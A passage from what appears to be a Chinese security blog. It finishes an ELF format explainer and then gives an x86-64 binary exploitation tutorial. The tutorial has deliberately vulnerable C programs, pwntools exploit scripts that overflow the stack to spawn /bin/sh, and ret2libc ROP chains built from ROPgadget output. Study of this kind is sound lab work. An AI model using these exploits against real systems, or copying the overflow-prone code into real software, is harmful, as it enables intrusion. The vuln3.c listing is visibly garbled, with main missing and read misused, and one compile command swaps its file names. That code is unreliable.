<p><strong>Special Sections</strong><br><img src="/images/elfpart1/specialsec.png"></p>
<p><code>.bss</code> 保存程序内存映像中未初始化的数据。程序开始时，系统把这些数据初始化为0。<br><code>.comment</code> 保存版本控制信息。<br><code>.data</code> and <code>.datal</code> 保存程序内存映像中已经初始化的数据。<br><code>.debug</code> 保存符号的调试信息。<br><code>.dynamic</code> 保存动态链接信息。<br><code>.dynstr</code> 保存动态链接需要的字符串。<br><code>.dynsym</code> 保存动态链接符号表。<br><code>.fini</code> 保存进程退出代码所需执行的指令。<br><code>.got</code> 保存全局偏移表。<br><code>.hash</code> 保存符号哈希表。<br><code>.init</code> 保存程序初始化代码所执行的指令。在main之前调用。<br><code>.interp</code> 保存程序解释器的路径名。<br><code>.line</code> 保存符号调试用到的行号。<br><code>.note</code> 按照一定格式保存注释信息。<br><code>.plt</code> 保存过程链接表。<br><code>.relname</code> and <code>.relaname</code> 保存重定位的相关信息。<br><code>.rodata</code> and <code>.rodatal</code> 保存进程映像中不可写segment里的只读数据。<br><code>.shstrtab</code> 保存section的名字。<br><code>.strtab</code> 保存字符串表，这些字符串通常代表符号表中表项的名字。<br><code>.symtab</code> 保存一个符号表。<br><code>.text</code> 保存了程序的执行指令。<br>名字中包含<code>.</code>前缀的section是系统保留的。</p>
<h3 id="String-Table"><a href="#String-Table" class="headerlink" title="String Table"></a>String Table</h3><p>字符串表section保存着一些空字节结尾的字符串。<br>目标文件用symbol string table（.strtab）的字符串表示symbol的名字，用section header string table（.shstrtab这个table是由ELF头部中的<code>e_shstrndx</code>成员指定）的字符串表示section的名字（section header的<code>sh_name</code>成员保存的索引）。可以通过索引引用字符串表中的字符串。</p>
<h3 id="Symbol-Table"><a href="#Symbol-Table" class="headerlink" title="Symbol Table"></a>Symbol Table</h3><p>目标文件符号表保存着定位和重定位一个程序的符号定义和引用所需的信息。<br>符号表表项的数据结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word st_name;</span><br><span class="line">    Elf32_Addr st_value;</span><br><span class="line">    Elf32_Word st_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">    Elf32_Half st_shndx;</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>
<p><code>st_name</code> 这个成员保存了一个指向目标文件symbol string table的索引。<br><code>st_value</code> 符号的值，取决于上下文，可能是一个绝对值，一个地址等等。<br><code>st_size</code> 许多符号有相应的大小，例如一个数据对象的大小就是它所包含的字节数。<br><code>st_info</code> 指明了符号的类型和约束属性。  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_BIND(i) ((i)&gt;&gt;4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_TYPE(i) ((i)&amp;0xf)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_INFO(b, t) (((b)&lt;&lt;4)+((t)&amp;0xf))</span></span><br></pre></td></tr></table></figure>
<p><code>st_other</code> 目前为0，没有定义含义。<br><code>st_shndx</code> 每个符号表项都与一些section有关，这个成员保存着相关section header table的索引。<br>一个符号的约束决定了链接的可见性和行为。</p>
<blockquote>
<p><strong>Symbol Binding</strong>, ELF32_ST_BIND</p>
</blockquote>
<blockquote>
<table>
<thead>
<tr>
<th align="left">Name</th>
<th align="right">Value</th>
</tr>
</thead>
<tbody><tr>
<td align="left">STB_LOCAL</td>
<td align="right">0</td>
</tr>
<tr>
<td align="left">STB_GLOBAL</td>
<td align="right">1</td>
</tr>
<tr>
<td align="left">STB_WEAK</td>
<td align="right">2</td>
</tr>
<tr>
<td align="left">STB_LOPROC</td>
<td align="right">13</td>
</tr>
<tr>
<td align="left">STB_HIPROC</td>
<td align="right">15</td>
</tr>
</tbody></table>
</blockquote>
<p><code>STB_LOCAL</code> Local符号在包含它们的目标文件之外是不可见的。相同名字的Local符号可以在不同的文件中存在，而不会相互冲突。<br><code>STB_GLOBAL</code> Global符号对要链接到一起的所有目标文件都是可见的。如果一个文件中定义了一个Global符号，那么另一个文件中无需定义，可直接引用此Global符号。<br><code>STB_WEAK</code> Weak符号类似于Global符号，只是它约束的定义优先级较低。<br><code>STB_LOPROC</code>至<code>STB_HIPROC</code> 此范围内的取值留作处理器相关的语义。</p>
<blockquote>
<p><strong>Symbol Types</strong>, ELF32_ST_TYPE</p>
</blockquote>
<blockquote>
<table>
<thead>
<tr>
<th align="left">Name</th>
<th align="right">Value</th>
</tr>
</thead>
<tbody><tr>
<td align="left">STT_NOTYPE</td>
<td align="right">0</td>
</tr>
<tr>
<td align="left">STT_OBJECT</td>
<td align="right">1</td>
</tr>
<tr>
<td align="left">STT_FUNC</td>
<td align="right">2</td>
</tr>
<tr>
<td align="left">STT_SECTION</td>
<td align="right">3</td>
</tr>
<tr>
<td align="left">STT_FILE</td>
<td align="right">4</td>
</tr>
<tr>
<td align="left">STT_LOPROC</td>
<td align="right">13</td>
</tr>
<tr>
<td align="left">STT_HIPROC</td>
<td align="right">15</td>
</tr>
</tbody></table>
</blockquote>
<p><code>STT_NOTYPE</code> 未指定符号类型。<br><code>STT_OBJECT</code> 符号对应一个数据对象，比如变量、数组等。<br><code>STT_FUNC</code> 符号对应一个函数或其它可执行的代码。<br><code>STT_SECTION</code> 符号对应一个section。这种类型的符号表项位于符号表最前面，用于重定位，通常具有STB_LOCAL约束。<br><code>STT_FILE</code> 此符号的名字也就是目标文件对应源文件的名字。<br><code>STT_LOPROC</code>至<code>STT_HIPROC</code> 此范围间的取值留作处理器相关的语义。</p>
<p><strong>Symbol Values</strong><br>符号表项在不同的目标文件类型中对st_value成员的解释稍有不同。<br>1）可重定位文件：如果符号对应section的索引是SHN_COMMON，那么st_value保存的是符号的对齐约束条件。<br>2）可重定位文件：如果是一个已经定义的符号，st_value保存着该符号在对应section中的偏移，即从st_shndx标识的section开始处的一个偏移量。<br>3）可执行目标文件和共享目标文件：为了使文件中的符号对动态链接器来说更加有用，st_value保存着一个虚拟地址。section偏移（文件解释）让位给虚拟地址（内存解释），因为在这种情况下，section偏移计数已经不重要了。<br>除了上面提到的，符号表的取值含义对不同的目标文件来说是类似的，程序也就能够采用高效的方法来访问数据。</p>
<h3 id="Relocation"><a href="#Relocation" class="headerlink" title="Relocation"></a>Relocation</h3><p>重定位是将符号引用和符号定义链接到一起的过程。比如，当一个程序调用一个函数，相关的调用指令在执行时必须把控制权传递到正确的目的地址。换句话说，就是可重定位文件必须包含一些信息，用来描述怎样修改它们的section内容，从而使可执行目标文件和共享目标文件掌握正确的信息用于创建进程的程序映像。重定位表项的数据结构如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset;</span><br><span class="line">    Elf32_Word r_info;</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset;</span><br><span class="line">    Elf32_Word r_info;</span><br><span class="line">    Elf32_Sword r_addend;</span><br><span class="line">&#125; Elf32_Rela;</span><br></pre></td></tr></table></figure>
<p><code>r_offset</code> 指出重定位操作的位置，对于可重定位文件，它的值是从section的开始处到重定位作用的存储单元的字节偏移量。对于可执行目标文件或共享目标文件，它的值是重定位作用的存储单元的虚拟地址。<br><code>r_info</code> 指出重定位作用的符号在符号表中的索引和重定位的类型。比如，一个调用指令的重定位表项将保存被调用函数的符号表索引，如果索引是 STN_UNDEF，即未定义的符号表索引，那么重定位使用 0 作为该符号的值。重定位的类型是处理器相关的。当代码访问重定位表项的重定位类型和符号表索引时，需要将ELF32_R_TYPE宏和 ELF32_R_SYM宏分别作用于表项的r_info成员。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(i) ((i)&gt;&gt;8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_TYPE(i) ((unsigned char)(i))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_INFO(s,t) (((s)&lt;&lt;8)+(unsigned char)(t))</span></span><br></pre></td></tr></table></figure>
<p><code>r_addend</code> 指定一个常量加数(addend)，用于计算可重定位字段存储的值。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2016/04/04/Linux-x64-PWN/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2016/04/04/Linux-x64-PWN/" class="post-title-link" itemprop="url">Linux_x64 PWN</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2016-04-04 10:51:12" itemprop="dateCreated datePublished" datetime="2016-04-04T10:51:12+08:00">2016-04-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="linux-x64与linux-x86的区别"><a href="#linux-x64与linux-x86的区别" class="headerlink" title="linux_x64与linux_x86的区别"></a>linux_x64与linux_x86的区别</h3><p>主要两点：<br>1.内存地址的范围由32位变成了64位，但是可以使用的内存地址不能大于<code>0x00007fffffffffff</code>，否则会抛出异常。<br>2.参数传递方式发生改变，x86参数都是保存在栈上，x64中的前6个参数依次保存在<code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>, <code>r8</code>和<code>r9</code>中，如果有更多参数则保存在栈上。<br>拿一个简单的程序演示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* compile on Linux_64 with gcc -fno-stack-protector vuln1 -o vuln1.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callsystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用gdb简单的反编译一下vulnerable_function<br><img src="/images/linuxx64pwn/vuln1.png"><br>由<code>lea rax, [rbp-0x80]</code>可知栈结构如下：<br><img src="/images/linuxx64pwn/vuln1_stack1.png"><br>所以要overwrite<code>rip</code>为callsystem()函数的地址，需要136(0x80+8)个占位字节+callsystem()的地址。<br><img src="/images/linuxx64pwn/callsystem.png"><br>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./vuln1&#x27;</span>)</span><br><span class="line">callsystem = <span class="number">0x400584</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">136</span> + p64(callsystem)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="使用工具寻找gadgets"><a href="#使用工具寻找gadgets" class="headerlink" title="使用工具寻找gadgets"></a>使用工具寻找gadgets</h3><p>x64的参数会保存在寄存器中，所以需要找一些类似于<code>pop rdi; ret</code>这样的gadget，借助工具如<a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget/tree/master">ROPgadget</a>查找会更加快捷方便。<br>再用一个简单的例子演示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* compile on linux_64 with gcc -fno-stack-protector vuln2.c -o vuln2 -ldl */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">systemaddr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *handle = dlopen(<span class="string">&quot;libc.so.6&quot;</span>, RTLD_LAZY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, dlsym(handle, <span class="string">&quot;system&quot;</span>));</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    systemaddr();</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序会打印system()在内存中的地址，这样就不需要考虑ASLR的问题了，只要想办法执行<code>system(&quot;/bin/sh&quot;)</code>就行。需要找一个将rdi指向”/bin/sh”的gadgets：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary vuln2 --only &quot;pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x00000000004006d2 : pop rbp ; ret</span><br><span class="line">0x00000000004006d1 : pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000400585 : ret</span><br><span class="line">0x0000000000400735 : ret 0xbdb8</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure>
<p>因为程序较小，没有<code>pop rdi; ret</code>这个gadgets。可以从libc.so中找，因为程序本身会load libc.so到内存中，并打印system()的地址，所以找到gadgets后可以通过system()计算出libc.so在内存中的基址，从而得到gadgets在内存中的实际地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot; | grep rdi</span><br><span class="line">0x000000000001f7a6 : pop rdi ; pop rbp ; ret</span><br><span class="line">0x0000000000022b1a : pop rdi ; ret</span><br><span class="line">0x00000000001331ad : pop rdi ; ret 0xffee</span><br></pre></td></tr></table></figure>
<p>成功找到了<code>pop rdi; ret</code>这个gadget，构造ROP链：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;\x00&quot;</span> * <span class="number">136</span> + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure>
<p>或者，因为我们只需要调用一次system()函数就可以获取shell，所以可以搜索不带ret的gadgets：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary libc.so.6 --only &quot;pop|call&quot; | grep rdi</span><br><span class="line">0x000000000017956b : call qword ptr [rdi]</span><br><span class="line">0x00000000000238f0 : call rdi</span><br><span class="line">0x00000000000fa479 : pop rax ; pop rdi ; call rax</span><br><span class="line">0x00000000000fa47a : pop rdi ; call rax</span><br></pre></td></tr></table></figure>
<p>发现<code>pop rax ; pop rdi ; call rax</code>也可以完成目标，将<code>rax</code>赋值system()的地址，<code>rdi</code>赋值为”/bin/sh”的地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;\x00&quot;</span> * <span class="number">136</span> + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr)</span><br></pre></td></tr></table></figure>
<p>这两个ROP链都可以完成目标，随便选择一个进行攻击即可。<br>最终的exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./vuln2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr_str = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">system_addr = <span class="built_in">int</span>(system_addr_str,<span class="number">16</span>)</span><br><span class="line">base_addr = system_addr - libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">binsh_addr = base_addr + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">pop_ret_addr = base_addr + <span class="number">0x0000000000022b1a</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span> * <span class="number">136</span> + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="通用gadgets"><a href="#通用gadgets" class="headerlink" title="通用gadgets"></a>通用gadgets</h3><p>程序在编译过程中会加入一些通用的函数来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但初始化过程是相同的，因此针对这些初始化函数，可以提取一些通用的gadgets来用。<br>拿一个升级版的程序演示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* compile on linux_64 with gcc -o vuln3 vuln3.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个程序只有一个buffer overflow，先要想办法泄露内存信息，找到system()的值，再传递<code>&quot;/bin/sh&quot;</code>到<code>.bss</code>段，最后调用<code>system(&quot;/bin/sh&quot;)</code>。源程序中使用了<code>write()</code>和<code>read()</code>函数，可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。<br>在x64下有一些万能的gadgets可以使用。比如用<code>objdump -d vuln3</code>观察一下<code>__libc_csu_init()</code>这个函数。程序只要调用了libc.so，就会有这个函数对libc进行初始化。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">00000000004005a0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  4005a0:	48 89 6c 24 d8       	mov    %rbp,-0x28(%rsp)</span><br><span class="line">  4005a5:	4c 89 64 24 e0       	mov    %r12,-0x20(%rsp)</span><br><span class="line">  4005aa:	48 8d 2d 73 08 20 00 	lea    0x200873(%rip),%rbp        # 600e24 &lt;__init_array_end&gt;</span><br><span class="line">  4005b1:	4c 8d 25 6c 08 20 00 	lea    0x20086c(%rip),%r12        # 600e24 &lt;__init_array_end&gt;</span><br><span class="line">  4005b8:	4c 89 6c 24 e8       	mov    %r13,-0x18(%rsp)</span><br><span class="line">  4005bd:	4c 89 74 24 f0       	mov    %r14,-0x10(%rsp)</span><br><span class="line">  4005c2:	4c 89 7c 24 f8       	mov    %r15,-0x8(%rsp)</span><br><span class="line">  4005c7:	48 89 5c 24 d0       	mov    %rbx,-0x30(%rsp)</span><br><span class="line">  4005cc:	48 83 ec 38          	sub    $0x38,%rsp</span><br><span class="line">  4005d0:	4c 29 e5             	sub    %r12,%rbp</span><br><span class="line">  4005d3:	41 89 fd             	mov    %edi,%r13d</span><br><span class="line">  4005d6:	49 89 f6             	mov    %rsi,%r14</span><br><span class="line">  4005d9:	48 c1 fd 03          	sar    $0x3,%rbp</span><br><span class="line">  4005dd:	49 89 d7             	mov    %rdx,%r15</span><br><span class="line">  4005e0:	e8 1b fe ff ff       	callq  400400 &lt;_init&gt;</span><br><span class="line">  4005e5:	48 85 ed             	test   %rbp,%rbp</span><br><span class="line">  4005e8:	74 1c                	je     400606 &lt;__libc_csu_init+0x66&gt;</span><br><span class="line">  4005ea:	31 db                	xor    %ebx,%ebx</span><br><span class="line">  4005ec:	0f 1f 40 00          	nopl   0x0(%rax)</span><br><span class="line">  4005f0:	4c 89 fa             	mov    %r15,%rdx</span><br><span class="line">  4005f3:	4c 89 f6             	mov    %r14,%rsi</span><br><span class="line">  4005f6:	44 89 ef             	mov    %r13d,%edi</span><br><span class="line">  4005f9:	41 ff 14 dc          	callq  *(%r12,%rbx,8)</span><br><span class="line">  4005fd:	48 83 c3 01          	add    $0x1,%rbx</span><br><span class="line">  400601:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  400604:	75 ea                	jne    4005f0 &lt;__libc_csu_init+0x50&gt;</span><br><span class="line">  400606:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx</span><br><span class="line">  40060b:	48 8b 6c 24 10       	mov    0x10(%rsp),%rbp</span><br><span class="line">  400610:	4c 8b 64 24 18       	mov    0x18(%rsp),%r12</span><br><span class="line">  400615:	4c 8b 6c 24 20       	mov    0x20(%rsp),%r13</span><br><span class="line">  40061a:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14</span><br><span class="line">  40061f:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15</span><br><span class="line">  400624:	48 83 c4 38          	add    $0x38,%rsp</span><br><span class="line">  400628:	c3                   	retq   </span><br></pre></td></tr></table></figure>
